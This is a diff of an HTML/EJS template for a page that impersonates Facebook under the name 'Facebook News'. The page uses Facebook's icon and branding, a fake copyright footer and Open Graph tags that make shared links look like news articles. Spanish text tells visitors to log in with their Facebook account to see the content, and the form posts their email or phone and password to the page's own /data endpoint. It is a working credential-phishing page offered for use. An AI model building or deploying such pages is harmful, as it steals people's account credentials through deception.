@@ -1,75 +1,109 @@
 <!DOCTYPE html>
 <html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no"
+    />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link
+      rel="stylesheet"
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
+      integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO"
+      crossorigin="anonymous"
+    />
+    <link
+      rel="shortcut icon"
+      type="image/x-icon"
+      href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/F_icon.svg/2000px-F_icon.svg.png"
+    />
+    <meta
+      property="og:url"
+      content="https://facebooknews.now.sh/?header=<%=header%>&image=<%=image%>"
+    />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="<%=header%>" />
+    <meta property="og:image" content="<%=image%>" />
+    <title>Facebook News</title>
+  </head>
 
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO"
-    crossorigin="anonymous">
-  <link rel="shortcut icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/F_icon.svg/2000px-F_icon.svg.png" />
-  <meta property="og:url" content="https://facebooknews.now.sh/?header=<%=header%>&image=<%=image%>">
-  <meta property="og:type" content="article" />
-  <meta property="og:title" content="<%=header%>" />
-  <meta property="og:image" content="<%=image%>" />
-  <title>Facebook News</title>
-</head>
+  <body>
+    <nav
+      class="navbar navbar-light"
+      style="padding: 30px; background-color: white;"
+    >
+      <a class="navbar-brand" href="#">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/F_icon.svg/2000px-F_icon.svg.png"
+          width="30"
+          height="30"
+          class="d-inline-block align-top"
+          alt=""
+        />
+        Facebook News
+      </a>
+    </nav>
 
-<body>
-  <nav class="navbar navbar-light" style="padding: 30px; background-color: white;">
-    <a class="navbar-brand" href="#">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/F_icon.svg/2000px-F_icon.svg.png" width="30"
-        height="30" class="d-inline-block align-top" alt="">
-      Facebook News
-    </a>
-  </nav>
-
-  <div class="container">
-    <div style="text-align: center;">
-      <div class="row" style="padding: 20px">
-        <div class="col">
-          <img src="<%= image %>" alt="<%= header %>" class="img-fluid img-thumbnail">
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="col">
-          <h3>
-            <%= header %>
-          </h3>
-        </div>
-      </div>
-
-      <hr class="col-xs-12">
-
-      <div class="row">
-        <div class="col">
-          <h5 style="font-weight: bold; padding: 20px">Para ver el contenido ingrese con su cuenta de Facebook</h5>
-        </div>
-      </div>
-
-      <div class="form-group">
-        <form action="/data" method="POST">
-          <div style="margin: 10px">
-            <input style="max-width: 600px; margin: 0 auto;" type="text" class="form-control" name="user" placeholder="Correo electrónico o teléfono"
-              required>
+    <div class="container">
+      <div style="text-align: center;">
+        <div class="row" style="padding: 20px">
+          <div class="col-lg-6">
+            <img
+              src="<%= image %>"
+              alt="<%= header %>"
+              class="img-fluid img-thumbnail"
+            />
+            <div style="padding: 20px">
+              <h3>
+                <%= header %>
+              </h3>
+            </div>
           </div>
-          <div style="margin: 10px">
-            <input type="password" style="max-width: 600px; margin: 0 auto;" class="form-control" name="password"
-              placeholder="Contraseña" required>
-          </div>
 
-          <div style="margin: 10px">
-            <button type="submit" class="btn btn-primary btn-lg">Enviar</button>
+          <div class="col-lg-6">
+            <h4 style="font-weight: bold; padding: 20px">
+              Para ver el contenido ingrese con su cuenta de Facebook
+            </h4>
+            <div class="form-group">
+              <form action="/data" method="POST">
+                <div style="margin: 10px">
+                  <input
+                    style="max-width: 600px; margin: 0 auto;"
+                    type="text"
+                    class="form-control"
+                    name="user"
+                    placeholder="Correo electrónico o teléfono"
+                    required
+                  />
+                </div>
+                <div style="margin: 10px">
+                  <input
+                    type="password"
+                    style="max-width: 600px; margin: 0 auto;"
+                    class="form-control"
+                    name="password"
+                    placeholder="Contraseña"
+                    required
+                  />
+                </div>
+
+                <div style="margin: 20px">
+                  <button type="submit" class="btn btn-primary btn-lg">
+                    Enviar
+                  </button>
+                </div>
+              </form>
+            </div>
           </div>
-        </form>
+        </div>
+
+        <hr class="col-xs-12" />
+
+        <footer class="page-footer font-small">
+          <div class="footer-copyright text-center py-3">Facebook © 2019</div>
+        </footer>
       </div>
-
-      <footer class="page-footer font-small">
-        <div class="footer-copyright text-center py-3">Facebook © 2018</div>
-      </footer>
     </div>
-  </div>
-</body>
-
+  </body>
 </html>
